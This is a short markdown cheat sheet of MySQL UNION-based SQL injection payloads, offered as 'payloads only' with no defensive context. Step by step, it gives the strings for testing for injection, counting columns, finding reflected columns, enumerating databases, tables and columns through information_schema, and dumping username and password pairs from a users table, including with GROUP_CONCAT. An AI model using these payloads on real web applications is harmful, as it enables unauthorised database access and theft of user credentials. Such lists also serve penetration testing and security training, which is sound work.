# UNION SQL Injection — Payloads Only

## 1. Test for injection
```sql
'
"
```

## 2. Find column count
```sql
' ORDER BY 1 --+
' ORDER BY 2 --+
' ORDER BY 3 --+
' ORDER BY N --+   (increase until error)
```

## 3. Find reflected columns
```sql
' UNION SELECT 1,2,3,4,5 --+
-1' UNION SELECT 1,2,3,4,5 --+
```

## 4. Basic DB info
```sql
' UNION SELECT 1,2,database(),4,5 --+
' UNION SELECT 1,2,version(),4,5 --+
' UNION SELECT 1,2,user(),4,5 --+
' UNION SELECT 1,2,current_user(),4,5 --+
```

## 5. Enumerate databases
```sql
' UNION SELECT 1,2,schema_name,4,5 FROM information_schema.schemata --+
```

## 6. Enumerate tables
```sql
' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables WHERE table_schema=database() --+
' UNION SELECT 1,2,table_name,4,5 FROM information_schema.tables WHERE table_schema='DB_NAME' --+
```

## 7. Enumerate columns
```sql
' UNION SELECT 1,2,column_name,4,5 FROM information_schema.columns WHERE table_name='TABLE_NAME' --+
```

## 8. GROUP_CONCAT (dump multiple rows at once)
```sql
' UNION SELECT 1,2,group_concat(table_name),4,5 FROM information_schema.tables WHERE table_schema=database() --+
' UNION SELECT 1,2,group_concat(column_name),4,5 FROM information_schema.columns WHERE table_name='users' --+
' UNION SELECT 1,2,group_concat(username,0x3a,password),4,5 FROM users --+
```

## 9. Dump data directly
```sql
' UNION SELECT 1,2,username,password,5 FROM users --+
' UNION SELECT username,password FROM users --+
```

## Comment styles (MySQL)
```sql
--+
-- 
#
```
